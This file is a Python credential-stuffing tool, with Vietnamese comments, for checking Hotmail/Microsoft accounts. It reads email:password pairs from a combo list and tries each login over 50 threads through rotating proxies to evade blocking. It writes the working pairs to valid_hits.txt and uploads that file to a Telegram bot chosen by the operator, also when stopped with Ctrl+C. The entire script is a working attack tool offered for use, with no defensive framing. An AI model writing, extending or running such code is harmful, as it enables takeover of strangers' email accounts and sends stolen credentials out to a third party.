import random
import threading
import requests
import signal
import sys
from mailhub import MailHub
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

init(autoreset=True)

mail = MailHub()
write_lock = threading.Lock()
running = True  # Biến kiểm soát việc tiếp tục kiểm tra

def signal_handler(sig, frame):
    global running
    print(Fore.RED + "\nĐang dừng tool... Gửi file kết quả lên Telegram!")
    running = False  # Dừng kiểm tra ngay lập tức
    if os.path.exists("valid_hits.txt") and os.stat("valid_hits.txt").st_size > 0:
        send_to_telegram("valid_hits.txt", bot_token, chat_id)
    sys.exit(0)  # Thoát chương trình ngay sau khi gửi file

# Bắt tín hiệu Ctrl+C để dừng tool đúng cách
signal.signal(signal.SIGINT, signal_handler)

def validate_line(line):
    parts = line.strip().split(":")
    return (parts[0], parts[1]) if len(parts) == 2 else (None, None)

def attempt_login(email, password, proxy):
    global running
    if not running:
        return  # Ngừng kiểm tra nếu tool bị dừng

    res = mail.loginMICROSOFT(email, password, proxy)[0]
    if res == "ok":
        print(Fore.GREEN + f"Valid   | {email}:{password}")
        with write_lock:
            with open("valid_hits.txt", "a", encoding="utf-8") as hits_file:
                hits_file.write(f"{email}:{password}\n")
    else:
        print(Fore.RED + f"Invalid | {email}:{password}")

def process_combo_file(proxies):
    global running
    with open("combo.txt", "r") as file:
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for line in file:
                if not running:
                    break  # Dừng nếu tool bị tắt

                email, password = validate_line(line)
                if not email or not password:
                    print(Fore.YELLOW + f"Invalid format: {line.strip()}")
                    continue

                proxy = {"http": f"http://{random.choice(proxies).strip()}"}
                futures.append(executor.submit(attempt_login, email, password, proxy))

            for future in as_completed(futures):
                if not running:
                    break  # Dừng ngay khi tool bị tắt
                future.result()

def send_to_telegram(file_path, bot_token, chat_id):
    if not os.path.exists(file_path) or os.stat(file_path).st_size == 0:
        print(Fore.RED + "File rỗng, không có tài khoản hợp lệ.")
        return

    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': chat_id, 'caption': "Danh sách tài khoản hợp lệ:"}
        try:
            response = requests.post(f"https://api.telegram.org/bot{bot_token}/sendDocument", data=data, files=files)
            if response.status_code == 200:
                print(Fore.GREEN + "Đã gửi file lên Telegram!")
            else:
                print(Fore.RED + f"Lỗi gửi file, mã lỗi: {response.status_code}")
        except Exception as e:
            print(Fore.RED + f"Lỗi khi gửi file: {e}")

def main():
    global bot_token, chat_id
    bot_token = input(Fore.CYAN + "Nhập token bot Telegram: ").strip()
    chat_id = input(Fore.CYAN + "Nhập ID chat Telegram: ").strip()

    while True:
        print(Fore.CYAN + "\nMenu:")
        print("1. Bắt đầu kiểm tra Hotmail")
        print("2. Thoát")
        choice = input(Fore.CYAN + "Nhập lựa chọn: ").strip()

        if choice == "1":
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()

            print(Fore.CYAN + "Bắt đầu kiểm tra...")
            process_combo_file(proxies)
            print(Fore.CYAN + "Hoàn tất kiểm tra.")

            send_to_telegram("valid_hits.txt", bot_token, chat_id)

        elif choice == "2":
            print(Fore.CYAN + "Thoát chương trình. Tạm biệt!")
            break
        else:
            print(Fore.RED + "Lựa chọn không hợp lệ, vui lòng thử lại.")

        input(Fore.CYAN + "Nhấn phím bất kỳ để tiếp tục...")
        os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    main()
